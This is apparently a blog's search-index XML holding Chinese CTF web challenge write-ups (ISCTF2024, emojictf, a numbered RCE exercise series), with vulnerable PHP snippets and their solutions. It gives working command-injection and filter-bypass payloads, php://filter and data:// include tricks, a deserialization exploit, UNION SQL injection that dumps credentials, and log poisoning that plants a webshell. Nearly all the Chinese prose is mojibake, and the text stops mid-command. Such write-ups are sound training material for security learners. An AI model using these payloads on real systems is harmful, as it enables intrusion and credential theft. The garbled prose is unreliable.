<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>isctf2024web</title>
      <link href="/2025/03/16/isctf2024web/"/>
      <url>/2025/03/16/isctf2024web/</url>
      
        <content type="html"><![CDATA[<h4 id="ISCTF2024ï¼š"><a href="#ISCTF2024ï¼š" class="headerlink" title="ISCTF2024ï¼š"></a>ISCTF2024ï¼š</h4><h4 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php:"></a>1z_php:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;J&#x27;]))&#123;  $call=$_POST[&#x27;J&#x27;];  $dangerous_commands = [&#x27;cat&#x27;, &#x27;tac&#x27;, &#x27;head&#x27;, &#x27;nl&#x27;, &#x27;more&#x27;, &#x27;less&#x27;, &#x27;tail&#x27;, &#x27;vi&#x27;, &#x27;sed&#x27;, &#x27;od&#x27;];  foreach ($dangerous_commands as $command) &#123;    if (preg_match(&quot;/$command/i&quot;, $call)) &#123;      die(&quot;è¿™äº›ä¸ªå±é™©å‡½æ•°å¯ä¸å…´ä½¿å•Š&quot;);    &#125;  &#125;  system($call);&#125;?&gt;</span><br></pre></td></tr></table></figure><p>J&#x3D;ls &#x2F;   J&#x3D;uniq &#x2F;f14g</p><h4 id="25æ—¶æ™“å±±ç‘å¸Œç”Ÿæ—¥ä¼š"><a href="#25æ—¶æ™“å±±ç‘å¸Œç”Ÿæ—¥ä¼š" class="headerlink" title="25æ—¶æ™“å±±ç‘å¸Œç”Ÿæ—¥ä¼š:"></a>25æ—¶æ™“å±±ç‘å¸Œç”Ÿæ—¥ä¼š:</h4><p>ä½ ä¸æ˜¯çƒ¤pï¼è¦æ˜¯Project Sekaiçš„å®¢æˆ·ç«¯è¯·æ±‚æ‰èƒ½åŠ å…¥ç”Ÿæ—¥ä¼š</p><p>åœ¨UAå¤´ä¸Šé¢æ”¹å¾—åˆ°ï¼šä½ ä¼¼ä¹æ²¡åœ¨æ­£ç¡®çš„æ—¶é—´æ¥â€¦ï¼Œé¢ï¼Œæ—¶é—´:ä¼ªé€ data:Date: Thu, 27 Aug 2024 05:00:00 GMT</p><h4 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce:"></a>ezrce:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;cmd&#x27;])) &#123;   $cmd = $_GET[&#x27;cmd&#x27;];   if (preg_match(&quot;/flag|cat|ls|echo|php|bash|sh|more| |less|head|tail|[\|\&amp;\&gt;\&lt;]|eval|system|exec|popen|shell_exec/i&quot;, $cmd)) &#123;     die(&quot;Blocked by security filter!&quot;);   &#125; else &#123;     eval($cmd);   &#125; &#125; else &#123;   highlight_file(__FILE__); </span><br></pre></td></tr></table></figure><p>cmd&#x3D;var_dump(scandir(â€˜&#x2F;â€˜));è¿›è¡Œè¯»å–æ ¹ç›®å½•ä¸‹é¢çš„æ–‡ä»¶å‘ç°flagï¼Œ</p><p>æ³•1ï¼šcmd&#x3D;include$_GET[1];&amp;1&#x3D;pHp:&#x2F;&#x2F;FilTer&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag ç„¶åè§£ç </p><p>æ³•2ï¼š?cmd&#x3D;var_dump(file_get_contents($_GET[â€˜1â€™]));&amp;1&#x3D;&#x2F;flag</p><p>æ³•3:å–åç»•è¿‡</p><p>æ³•4:cmd&#x3D;passthru(â€˜cd%09..;cd%09..;uniq%09&#x2F;?l*â€™);</p><h4 id="ezserialize"><a href="#ezserialize" class="headerlink" title="ezserialize:"></a>ezserialize:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php error_reporting(0); class Flag &#123;   private $flag;   public function __construct() &#123;     $this-&gt;flag = file_get_contents(&#x27;/flag&#x27;);   &#125;   public function getFlag() &#123;     return $this-&gt;flag;   &#125;   public function __toString() &#123;     return &quot;You can&#x27;t directly access the flag!&quot;;   &#125; &#125; class User &#123;   public $username;   public $isAdmin = false;   public function __construct($username) &#123;     $this-&gt;username = $username;   &#125;   public function __wakeup() &#123;     if ($this-&gt;isAdmin) &#123;       echo &quot;Welcome, admin! Here&#x27;s your flag: &quot; . (new Flag())-&gt;getFlag();     &#125; else &#123;       echo &quot;Hello, &quot; . htmlspecialchars($this-&gt;username) . &quot;!&quot;;     &#125;   &#125; &#125; if (isset($_GET[&#x27;data&#x27;])) &#123;   $data = $_GET[&#x27;data&#x27;];   $object = unserialize($data);   if ($object instanceof User) &#123;     echo $object;   &#125; else &#123;     echo &quot;Invalid object!&quot;;   &#125; &#125; else &#123;   highlight_file(__FILE__); &#125; ?&gt; </span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå°†falseæ”¹ä¸ºtrueç„¶åéšä¾¿ä¼ usernameå°±è¡Œäº†ï¼›</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag &#123;</span><br><span class="line">    private $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class User &#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $isAdmin = true;</span><br><span class="line">&#125;</span><br><span class="line">$user = new User();</span><br><span class="line">$user-&gt;username =&quot;1&quot;;</span><br><span class="line">echo serialize($user);</span><br></pre></td></tr></table></figure><h4 id="å°è“é²¨çš„ä¸´æ—¶å­˜å‚¨å®¤ï¼š"><a href="#å°è“é²¨çš„ä¸´æ—¶å­˜å‚¨å®¤ï¼š" class="headerlink" title="å°è“é²¨çš„ä¸´æ—¶å­˜å‚¨å®¤ï¼š"></a>å°è“é²¨çš„ä¸´æ—¶å­˜å‚¨å®¤ï¼š</h4><p>è¿™ä¸ªç›´æ¥ä¼ ä¸Šå»å‘ç°&#x2F;flagæ–‡ä»¶æ‰“ä¸å¼€æƒé™ä¸å¤Ÿ</p><p>å‘ç°&#x2F;down_file.sh:find &#x2F;var&#x2F;www&#x2F;localhost&#x2F;htdocs&#x2F;uploads&#x2F; -type f -name â€œ*.phpâ€ -exec rm -f {} ;</p><p>å¯ä»¥æ”¹ä¸ºï¼š&#x2F;flag &gt; &#x2F;tmp&#x2F;1.txt ç„¶åç­‰ä¼šå°±okäº†</p><h4 id="å°è“é²¨çš„å†’é™©ï¼š"><a href="#å°è“é²¨çš„å†’é™©ï¼š" class="headerlink" title="å°è“é²¨çš„å†’é™©ï¼š"></a>å°è“é²¨çš„å†’é™©ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a = &quot;isctf2024&quot;; $b = $_GET[&quot;b&quot;]; @parse_str($b); if ($a[0] != &#x27;QNKCDZO&#x27; &amp;&amp; md5($a[0]) == md5(&#x27;QNKCDZO&#x27;)) &#123;   $num = $_POST[&quot;num&quot;];   if($num == 2024)&#123;     die(&quot;QAQ&quot;);   &#125;   if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;     die(&quot;no no no!&quot;);   &#125;   if(intval($num,0) == 2024)&#123;     if (isset($_GET[&#x27;which&#x27;]))&#123;       $which = $_GET[&#x27;which&#x27;];       switch ($which)&#123;         case 0:           print(&#x27;QAQ&#x27;);         case 1:         case 2:           require_once $which.&#x27;.php&#x27;;           echo $flag;           break;         default:           echo GWF_HTML::error(&#x27;PHP-0817&#x27;, &#x27;Hacker NoNoNo!&#x27;, false);           break; </span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯md5ç»•è¿‡ï¼šb&#x3D;a[0]&#x3D;240610708</p><p>ç„¶å:å°æ•°ç»•è¿‡ï¼šnum&#x3D;2024.1æˆ–è€…8è¿›åˆ¶</p><p>ç„¶åï¼š</p><p>if (isset($_GET[â€˜whichâ€™])){       $which &#x3D; $_GET[â€˜whichâ€™];       switch ($which){         case 0:           print(â€˜QAQâ€™);         case 1:         case 2:           require_once $which.â€™.phpâ€™;           echo $flag;           break;         default:           echo GWF_HTML::error(â€˜PHP-0817â€™, â€˜Hacker NoNoNo!â€™, false);           break;</p><p>ä¼ which&#x3D;flag æ­£å¥½åŒ¹é…flag.phpå°±å‡ºæ¥äº†</p><h4 id="å°è“é²¨çš„ç§˜å¯†ï¼š"><a href="#å°è“é²¨çš„ç§˜å¯†ï¼š" class="headerlink" title="å°è“é²¨çš„ç§˜å¯†ï¼š"></a>å°è“é²¨çš„ç§˜å¯†ï¼š</h4><p>æ‰“å¼€å‘ç°302è·³è½¬ï¼›ç›´æ¥æŠ“åŒ…å‡ºæ¥flag</p><h4 id="UP-UPloader"><a href="#UP-UPloader" class="headerlink" title="UP!UPloader:"></a>UP!UPloader:</h4><p>æ–‡ä»¶ä¸Šä¼ ï¼Œä¼ ä¸Šå»å°é©¬ï¼›ç„¶åå‘ç°include.phpä¼šå‡ºæ¥æ–‡ä»¶æºç ï¼Œå…ˆè¯»upload.php</p><p>æ–‡ä»¶ä¸Šä¼ åˆ° .&#x2F;uploads&#x2F; ç›®å½•ä¸‹ï¼Œæ–‡ä»¶åè¢«é‡å‘½åæˆ [md5 åŠ å¯†](<a href="https://so.csdn.net/so/search?q=md5">https://so.csdn.net/so/search?q=md5</a> åŠ å¯†&amp;spm&#x3D;1001.2101.3001.7020)+åç¼€ï¼ŒæŒ‰ç…§é€»è¾‘è®¿é—®</p><p>ç„¶åèšå‰‘è¿æ¥å°±è¡Œäº†</p><p>å‘ç°æ‰¾ä¸åˆ°è¿™é‡Œå¯ä»¥åœ¨ç½‘ç«™ä¸Šé¢æ‰§è¡Œ:</p><p>cmd&#x3D;system(â€˜envâ€™);</p><p>cmd&#x3D;phpinfo();éƒ½å¯ä»¥æ‰¾åˆ°</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>emojictfweb</title>
      <link href="/2025/03/16/emojictfweb/"/>
      <url>/2025/03/16/emojictfweb/</url>
      
        <content type="html"><![CDATA[<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE:"></a>RCE:</h3><p>å‘ç°f12ä¸èƒ½ä½¿ç”¨ï¼Œæ²¡äº‹ï¼Œå¼ å¸ˆå‚…ç»™æˆ‘è¯´ctrl+shift+iå°±å¯ä»¥äº†ï¼Œok.è¯•äº†è¯•å‘ç°æ²¡æœ‰æœ‰ç”¨çš„ä¸œè¥¿ï¼Œdirsearchæ‰«æä¸€ä¸‹å‘ç°robots.txt</p><p>ç„¶åå‘ç° &#x2F;<a href="mailto:&#102;&#108;&#x40;&#103;&#46;&#112;&#x68;&#x70;">fl@g.php</a>,æŸ¥çœ‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;emo&#x27;]))&#123;   $emo = $_GET[&#x27;emo&#x27;];  if(!preg_match(&quot;/\;|\&quot;|\*| |[b-h]|[m-r]|\\$|\&#123;|\&#125;|\^|\&gt;/i&quot;,$emo))&#123;    system($emo);  &#125;  else&#123;    echo &quot;Again&quot;;    &#125;&#125;else&#123;  echo &quot;Try&quot;;&#125;</span><br></pre></td></tr></table></figure><p>å…ˆè¿›è¡ŒlsæŸ¥çœ‹ï¼Œå‘ç°flag.txtï¼Œç„¶åemo&#x3D;tail%09??a?.txtè¿›è¡ŒæŸ¥çœ‹</p><h3 id="http"><a href="#http" class="headerlink" title="http:"></a>http:</h3><h1 id="ä½ çš„User-Agentå¿…é¡»è¢«æœåŠ¡å™¨è¯†åˆ«ä¸ºEMOJI-CTF-User-Agent-v1-0-åªæœ‰ä½¿ç”¨æ­£ç¡®çš„HTTPæ–¹æ³•æ‰èƒ½è·å–flagï¼Œä¸åŒçš„æ–¹æ³•ä¼šå¾—åˆ°ä¸åŒçš„æç¤ºã€‚-éœ€è¦æä¾›æ­£ç¡®çš„è‡ªå®šä¹‰å¤´éƒ¨EMOJI-CTF-Authä¸”å…¶å€¼ä¸ºâ€™Passw0rd-â€™ã€‚-å…¨éƒ¨å®Œæˆä½ å°±èƒ½è·å¾—flag"><a href="#ä½ çš„User-Agentå¿…é¡»è¢«æœåŠ¡å™¨è¯†åˆ«ä¸ºEMOJI-CTF-User-Agent-v1-0-åªæœ‰ä½¿ç”¨æ­£ç¡®çš„HTTPæ–¹æ³•æ‰èƒ½è·å–flagï¼Œä¸åŒçš„æ–¹æ³•ä¼šå¾—åˆ°ä¸åŒçš„æç¤ºã€‚-éœ€è¦æä¾›æ­£ç¡®çš„è‡ªå®šä¹‰å¤´éƒ¨EMOJI-CTF-Authä¸”å…¶å€¼ä¸ºâ€™Passw0rd-â€™ã€‚-å…¨éƒ¨å®Œæˆä½ å°±èƒ½è·å¾—flag" class="headerlink" title="ä½ çš„User-Agentå¿…é¡»è¢«æœåŠ¡å™¨è¯†åˆ«ä¸ºEMOJI_CTF_User_Agent_v1.0  åªæœ‰ä½¿ç”¨æ­£ç¡®çš„HTTPæ–¹æ³•æ‰èƒ½è·å–flagï¼Œä¸åŒçš„æ–¹æ³•ä¼šå¾—åˆ°ä¸åŒçš„æç¤ºã€‚ éœ€è¦æä¾›æ­£ç¡®çš„è‡ªå®šä¹‰å¤´éƒ¨EMOJI-CTF-Authä¸”å…¶å€¼ä¸ºâ€™Passw0rd!â€™ã€‚ å…¨éƒ¨å®Œæˆä½ å°±èƒ½è·å¾—flag!!!"></a>ä½ çš„User-Agentå¿…é¡»è¢«æœåŠ¡å™¨è¯†åˆ«ä¸ºEMOJI_CTF_User_Agent_v1.0  åªæœ‰ä½¿ç”¨æ­£ç¡®çš„HTTPæ–¹æ³•æ‰èƒ½è·å–flagï¼Œä¸åŒçš„æ–¹æ³•ä¼šå¾—åˆ°ä¸åŒçš„æç¤ºã€‚ éœ€è¦æä¾›æ­£ç¡®çš„è‡ªå®šä¹‰å¤´éƒ¨EMOJI-CTF-Authä¸”å…¶å€¼ä¸ºâ€™Passw0rd!â€™ã€‚ å…¨éƒ¨å®Œæˆä½ å°±èƒ½è·å¾—flag!!!</h1><p>åœ¨bpä¸Šé¢æ”¹ç„¶ååœ¨httpæ–¹æ³•ä¸Šé¢è¿›è¡Œçˆ†ç ´æµ‹è¯•æ˜¯ä»€ä¹ˆæ–¹æ³•ï¼Œå‘ç°æ˜¯PUTæ–¹æ³•ï¼Œç„¶åè®¿é—®fl1l1l1l1ag.php</p><h3 id="e4-sql"><a href="#e4-sql" class="headerlink" title="e4_sql:"></a>e4_sql:</h3><p>è¿›è¡Œè®¿é—®å‘ç°1â€æ—¶å€™æŠ¥é”™è¯´æ˜æ˜¯å­—ç¬¦å½¢æ³¨å…¥</p><p>1â€ order by 2#çš„æ—¶å€™å’Œ 3å’Œ4çš„æ—¶å€™ä¸ä¸€æ ·è¯´æ˜æœ‰ä¿©åˆ—</p><p>-1â€ union select 1,2#å‘ç°2æ˜¯å›æ˜¾ä½ç½®</p><p>ç„¶åä»–æ²¡æœ‰è¿‡æ»¤ï¼Œç›´æ¥æ³¨å°±è¡Œäº†</p><p>-1â€ union select 1,database()#<br>-1â€ union select 1,(select group_concat(username,password) from information)#</p><h3 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web:"></a>easy_web:</h3><p>æ¬¢è¿æ‰“å¼€è¿™ä¸ªé¢˜ç›®!</p><p>ä½†æ˜¯ä½ çš„è®¿é—®è¢«æ‹’ç»äº†ï¼Œå› ä¸ºæˆ‘ä»¬é‡‡ç”¨äº†å’ŒçŸ¥ä¹ä¸€æ ·çš„åçˆ¬è™«ç­–ç•¥ï¼Œè€Œä½ çš„è®¿é—®è¢«è®¤ä¸ºæ˜¯è¿è§„çš„çˆ¬è™«äº†ã€‚</p><p>æ ¹æ®æç¤ºï¼š User-Agent:Baiduspider</p><p>ç„¶åï¼šæ¬¢è¿æ¥è‡ªåƒåœ¾ç™¾åº¦çš„è‡­è™«å­ï¼ä½†æ˜¯ä½ çˆ¬ä¸åˆ°ä»€ä¹ˆäº†ï¼Œå› ä¸ºæœ¬ç½‘ç«™ç°åœ¨ä»…å…è®¸æ¥è‡ªCloudFlare CDNçš„æµé‡</p><p>é‚£ä¹ˆCloudFlareCDNæ˜¯ä»€ä¹ˆï¼Œè¦ç‰¹åœ°æå‡ºæ¥å‘¢ï¼Œä¸çŸ¥é“å°±å»æœï¼ŒCloudflare HTTP æ ‡å¤´(<a href="https://developers.cloudflare.com/fundamentals/reference/http-headers/">Cloudflare HTTP æ ‡å¤´ Â·Cloudflare åŸºç¡€çŸ¥è¯†æ–‡æ¡£</a>)</p><p>ç„¶åå°±éšä¾¿å°è¯•äº†ä¸€ä¸‹</p><p>CF-Connecting-IP:1<br>CF-IPCountry:1</p><p>å‘ç°å¥½å§ï¼Œä½ æ¥è‡ªcloudflare CDNäº†ï¼Œä½†æ˜¯ä¸ºäº†å®‰å…¨ï¼Œåé¢çš„æœºå¯†å†…å®¹åªèƒ½é€šè¿‡æ´‹è‘±è®¿é—®ï¼ˆæˆ‘æ˜¯æ€ä¹ˆçŸ¥é“ä½ æ˜¯å¦æ¥è‡ªæ´‹è‘±çš„å‘¢ï¼Ÿè¿™ä¹Ÿæ˜¯CFæ‚„æ‚„å‘Šè¯‰æˆ‘çš„å‘€ï¼‰!</p><p>ç„¶åå»æŸ¥äº†æŸ¥:</p><p>CF-Connecting-IP:1<br>CF-IPCountry:T1</p><p>OKå®Œäº‹äº†ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SHOWRCE</title>
      <link href="/2025/03/05/SHOWRCE/"/>
      <url>/2025/03/05/SHOWRCE/</url>
      
        <content type="html"><![CDATA[<p>SHOWRCE</p><p>æ¥ä¸‹æ¥å¼€å§‹æˆ‘ä»¬çš„RCEåˆ·é¢˜SHOW</p><p>29ï¼š</p><p>if(isset(<br>$_GET[â€˜câ€™]));if(!preg_match(â€œ&#x2F;flag&#x2F;iâ€,$c)){eval($c);<br>}else{<br>highlight file( FILE );</p><p>å…ˆçœ‹ä»£ç åˆ†æå‡ºæ¥è¿™ä¸ªæ˜¯å‘½ä»¤æ‰§è¡Œï¼Œè®©æˆ‘ä»¬getä¼ å‚c,ç„¶åè¿‡æ»¤äº†flagå’Œä»–çš„å¤§å°å†™</p><p>é‚£ä¹ˆpayloadå°±å‡ºæ¥äº†ï¼šc&#x3D;system(â€˜tac fl*.phpâ€™);(ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–çš„æŸ¥çœ‹ç¬¦)</p><p>å…¶ä»–ï¼šc&#x3D;system(â€˜tac flâ€â€ag.phpâ€™);c&#x3D;system(â€˜tac fl&#96;&#96;ag.phpâ€™);c&#x3D;system(â€˜ta\c fl\ag.phpâ€™);ç­‰ç­‰</p><p>30ï¼š</p><p>if(isset($_GET[â€˜câ€™])){8c &#x3D; S GETLâ€™câ€™]:if(!preg_match(â€œ&#x2F;flag|system|php&#x2F;iâ€, $c)){eval($c):<br>}else{<br>highlight_file( FILE);</p><p>å’Œä¸Šé¢çš„å·®ä¸å¤šï¼Œå°±æ˜¯è¿‡æ»¤çš„å¤šäº†</p><p>payload:</p><p>?c&#x3D;passthru(â€œtac fla*â€);</p><p>?c&#x3D;echo<code>tac fla*</code>;</p><p>?c&#x3D;$a&#x3D;sys;$b&#x3D;tem;$c&#x3D;$a.$b;$c(â€œtac fla*â€);</p><p>?c&#x3D;echo shell_exec(â€œtac fla*â€);</p><p>?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(â€œtac flag.phpâ€);</p><p>echo <code>nl fl&#39;&#39;ag.p&#39;&#39;hp</code>;(showç­”æ¡ˆ)</p><p>31ï¼š</p><p>å¤šè¿‡æ»¤äº†cat sort è¿™ä¸ªæ€ä¹ˆè¶Šæ¥è¶Šå¤šäº†ï¼Œå¯ä»¥è¿›è¡Œä¼ å‚ï¼šc&#x3D;eval($_GET[a]);&amp;a&#x3D;system(â€˜cat flag.phpâ€™);ä¹Ÿå¯ä»¥ä½¿ç”¨passthru(è¦æ³¨æ„è¿‡æ»¤äº†ç©ºæ ¼)</p><p>32ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;, $c))&#123;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸å¯ä»¥ç”¨passthruåšï¼Œä¸è¿‡æ²¡å…³ç³»ï¼Œå¯ä»¥ä½¿ç”¨ä¼ªåè®®åšï¼Œä½†æ˜¯é¦–å…ˆè¦å…ˆä¼ å‚ï¼š</p><p>palyoad:</p><p>?c&#x3D;include%0a$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system("tac flag.php")?></p><p>ä¸Šé¢çš„å¯ä»¥ä½¿ç”¨åˆ°36ï¼Œä¸è¿‡è¦æ³¨æ„ä¸€äº›è¿‡æ»¤ï¼Œæ¯”å¦‚ç©ºæ ¼ä»€ä¹ˆçš„</p><p>37ï¼š</p><p>if(isset($_GET[â€˜câ€™])){   $c &#x3D; $_GET[â€˜câ€™];   if(!preg_match(â€œ&#x2F;flag&#x2F;iâ€, $c)){     include($c);     echo $flag;     } </p><p>ä½¿ç”¨é€‰æ‹©ä½¿ç”¨data:[?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;</p><p>æˆ–è€…ä¼ å°ğŸï¼š</p><p>?c&#x3D;include$_GET[a]?%3E&amp;a&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br> &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.logæ˜¯nginxé»˜è®¤çš„accessæ—¥å¿—è·¯å¾„ï¼Œè®¿é—®è¯¥è·¯å¾„æ—¶ï¼Œåœ¨User-Agentä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åç”¨ä¸­å›½èšå‰‘è¿æ¥å³å¯</p><p>ç„¶åä¸€ç›´åˆ°39å…³äº†ä¸Šé¢çš„éƒ½å¤§å·®ä¸å·®</p><p>40ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¸€ä¸‹å­ç»™æˆ‘å¼„ä¸ä¼šäº†ï¼Œ</p><p>åªèƒ½çœ‹wpåšäº†ï¼š</p><p>æ³•ä¸€</p><p>c&#x3D;eval(array_pop(next(get_defined_vars())));&#x2F;&#x2F;éœ€è¦POSTä¼ å…¥å‚æ•°ä¸º1&#x3D;system(â€˜tac fl*â€™);</p><p>get_defined_vars() è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡çš„å¤šç»´æ•°ç»„ã€‚è¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ï¼Œä¾‹å¦‚GETã€POSTã€FILEç­‰ç­‰ã€‚</p><p>next()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>array_pop() å‡½æ•°åˆ é™¤æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ å¹¶è¿”å›å…¶å€¼ã€‚</p><p>æ³•äºŒ</p><p>c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); æˆ–è€… c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</p><p>getcwd() å‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚å®ƒå¯ä»¥ä»£æ›¿pos(localeconv())</p><p>localeconv()ï¼šè¿”å›åŒ…å«æœ¬åœ°åŒ–æ•°å­—å’Œè´§å¸æ ¼å¼ä¿¡æ¯çš„å…³è”æ•°ç»„ã€‚è¿™é‡Œä¸»è¦æ˜¯è¿”å›å€¼ä¸ºæ•°ç»„ä¸”ç¬¬ä¸€é¡¹ä¸ºâ€.â€</p><p>pos():è¾“å‡ºæ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä¸æ”¹å˜æŒ‡é’ˆï¼›</p><p>current() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ ï¼ˆå•å…ƒï¼‰,é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ï¼Œå’Œpos()ä¸€æ ·</p><p>scandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚è¿™é‡Œå› ä¸ºå‚æ•°ä¸ºâ€.â€æ‰€ä»¥éå†å½“å‰ç›®å½•</p><p>array_reverse():æ•°ç»„é€†ç½®</p><p>next():å°†æ•°ç»„æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªï¼Œè¿™é‡Œå…¶å®å¯ä»¥çœç•¥å€’ç½®å’Œæ”¹å˜æ•°ç»„æŒ‡é’ˆï¼Œç›´æ¥åˆ©ç”¨[2]å–å‡ºæ•°ç»„ä¹Ÿå¯ä»¥</p><p>show_source():æŸ¥çœ‹æºç </p><p>pos() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚è¯¥å‡½æ•°æ˜¯current()å‡½æ•°çš„åˆ«åã€‚</p><p>æ¯ä¸ªæ•°ç»„ä¸­éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨çš„æŒ‡é’ˆæŒ‡å‘å®ƒçš„â€å½“å‰â€å…ƒç´ ï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚</p><p>æç¤ºï¼šè¯¥å‡½æ•°ä¸ä¼šç§»åŠ¨æ•°ç»„å†…éƒ¨æŒ‡é’ˆã€‚</p><p>ç›¸å…³çš„æ–¹æ³•ï¼š</p><p>current()è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚</p><p>end()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>next()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>prev()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>reset()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>each()è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚</p><p>ç„¶å41è·‘yuå¸ˆå‚…è„šæœ¬å°±okäº†</p><p>42ï¼š</p><p>ç»ˆäºç®€å•äº†ï¼›</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;   $c=$_GET[&#x27;c&#x27;];   system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;else&#123;   highlight_file(__FILE__); &#125;</span><br></pre></td></tr></table></figure><p>è¿™è¡Œä»£ç æ‰§è¡Œä¸€ä¸ªç³»ç»Ÿå‘½ä»¤ï¼Œè¯¥å‘½ä»¤ç”±å˜é‡ $c çš„å€¼æŒ‡å®šã€‚&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 æ˜¯ä¸€ä¸ª shell  é‡å®šå‘æ“ä½œï¼Œæ„å‘³ç€å‘½ä»¤çš„æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰å’Œæ ‡å‡†é”™è¯¯ï¼ˆstderrï¼‰éƒ½è¢«é‡å®šå‘åˆ°  &#x2F;dev&#x2F;nullï¼Œå³è¢«ä¸¢å¼ƒï¼Œï¼ˆä¸ªäººç†è§£æ˜¯å†…å®¹æ³¨é‡Šæ³¨é‡Šï¼‰ç”¨æˆ·ä¸ä¼šçœ‹åˆ°ä»»ä½•è¾“å‡ºç»“æœ æ‰€ä»¥ç›´æ¥&#x2F;c&#x3D;cat flag.php||%0aä½¿ç”¨ç®¡é“ç¬¦è¿›è¡Œç»•è¿‡è®©ä»–æ‰§è¡Œå‰é¢çš„</p><p>43ï¼š</p><p>æ¯”å‰é¢å¤šè¿‡æ»¤äº†catã€ï¼›ï¼Œé‚£å°±åˆ©ç”¨tacï¼Œuniq,less,more,strings,nlå‘½ä»¤æ¥æ‰“å°ï¼Œâ€œ||â€åˆ†å‰²</p><p>æˆ–è€…ä½¿ç”¨é‡å®šå‘ï¼šnl%20flag.php| tee 